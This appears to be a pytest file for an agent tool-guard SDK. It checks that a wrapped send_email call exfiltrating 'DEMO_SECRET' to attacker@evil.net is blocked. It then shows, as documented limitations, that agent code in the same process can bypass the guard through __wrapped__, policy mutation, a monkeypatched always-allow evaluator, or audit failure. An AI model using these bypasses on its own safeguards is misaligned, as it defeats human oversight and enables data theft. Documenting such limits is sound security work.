"""SDK trust-boundary tests (Phase 13.2, P5.6).

These tests document what the in-process SDK wrapper can and cannot enforce.
The wrapper is a guardrail for cooperative agent code. Code that controls the
same Python runtime can bypass it, so tests below *assert that the bypasses
exist*; they are limitation tests, not protections. Enforcement against a
malicious agent requires running tools in a separate process/service that
the agent cannot modify and that calls the AgentShield API.
"""

from backend.app.models.enums import ExecutionStatus, SecurityDecision
from sdk.agentshield import AgentShield


def _shield() -> AgentShield:
    return AgentShield(enable_audit_log=False, return_execution_result=True)


def _make_tool(shield: AgentShield, sink: list):
    @shield.protect_tool(tool_name="send_email")
    def send_email(to: str, body: str) -> str:
        sink.append(to)
        return "sent"

    return send_email


def test_wrapper_blocks_cooperative_call() -> None:
    sink: list = []
    tool = _make_tool(_shield(), sink)
    result = tool(to="attacker@evil.net", body="DEMO_SECRET")
    assert result.decision == SecurityDecision.BLOCK
    assert result.execution_status == ExecutionStatus.NOT_EXECUTED
    assert sink == []


def test_limitation_unwrapped_function_is_reachable() -> None:
    sink: list = []
    tool = _make_tool(_shield(), sink)
    assert tool.__wrapped__(to="attacker@evil.net", body="DEMO_SECRET") == "sent"
    assert sink == ["attacker@evil.net"]  # executed with no evaluation and no audit record


def test_limitation_policy_object_can_be_mutated_in_process() -> None:
    sink: list = []
    shield = _shield()
    tool = _make_tool(shield, sink)
    shield.policy.approved_domains.append("evil.net")
    shield.policy.protected_values.clear()
    shield.policy.rules.clear()
    result = tool(to="attacker@evil.net", body="DEMO_SECRET")
    assert result.decision == SecurityDecision.ALLOW
    assert sink == ["attacker@evil.net"]


def test_limitation_evaluator_can_be_monkeypatched() -> None:
    sink: list = []
    shield = _shield()
    tool = _make_tool(shield, sink)
    real = shield.evaluate_tool_call

    def always_allow(call):
        result = real(call)
        return result.model_copy(update={"decision": SecurityDecision.ALLOW})

    shield.evaluate_tool_call = always_allow
    assert tool(to="attacker@evil.net", body="DEMO_SECRET").decision == SecurityDecision.ALLOW
    assert sink == ["attacker@evil.net"]


def test_limitation_audit_persistence_failure_does_not_stop_execution() -> None:
    class BrokenLogger:
        def get_event(self, *_):
            raise RuntimeError("audit store down")

    sink: list = []
    shield = AgentShield(audit_logger=BrokenLogger(), return_execution_result=True)
    tool = _make_tool(shield, sink)
    assert tool(to="colleague@example.org", body="hello").execution_status == ExecutionStatus.EXECUTED
    assert sink == ["colleague@example.org"]
